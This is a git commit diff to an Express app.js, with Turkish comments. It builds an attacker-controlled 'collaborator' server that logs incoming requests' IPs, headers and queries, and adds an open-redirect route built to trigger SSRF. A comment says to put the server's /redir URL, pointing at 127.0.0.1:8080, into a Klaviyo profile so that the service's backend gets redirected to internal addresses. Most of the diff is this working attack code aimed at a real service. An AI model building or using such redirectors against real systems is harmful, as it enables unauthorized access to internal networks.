cfe49bb64d7e637dbfa9e2787cffc76b95b6356c
meksec <meksec32@gmail.com>
2026-08-24 12:08:01 +0300

    Update app.js

--- app.js
+++ app.js
@@ -4,13 +4,32 @@ const app = express();
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-app.use((req, res) => {
-    const method = req.method;
-    const url = req.url;
-    const header = req.headers;
-
-    console.log(method, url, header);
-    return res.status(200).send("OK");
+// 1. Loglama ve İnceleme Rotası
+app.use((req, res, next) => {
+    console.log('--- YENİ İSTEK GELDİ ---');
+    console.log('Method:', req.method);
+    console.log('URL:', req.url);
+    console.log('IP:', req.ip || req.headers['x-forwarded-for']);
+    console.log('Headers:', req.headers);
+    console.log('Query:', req.query);
+    console.log('------------------------');
+    next();
 });
 
-app.listen(3000, () => console.log("Collaborator 3000 portunda hazır!"));
+// 2. SSRF / Redirect Tetikleme Rotası
+// Kullanım: Klaviyo profilindeki URL'ye şunu yazacaksın: 
+// https://collab-fv3u.onrender.com/redir?target=http://127.0.0.1:8080/
+app.get('/redir', (req, res) => {
+    const target = req.query.target || 'http://127.0.0.1/';
+    console.log(`[!] Redirect tetiklendi! Hedef: ${target}`);
+    
+    // 302 Found ile hedef iç adrese veya porta fırlatıyoruz
+    return res.redirect(302, target);
+});
+
+// 3. Varsayılan Yanıt
+app.use((req, res) => {
+    return res.status(200).send("Collaborator success");
+});
+
+app.listen(3000, () => console.log("Gelişmiş Collaborator 3000 portunda devrede!"));
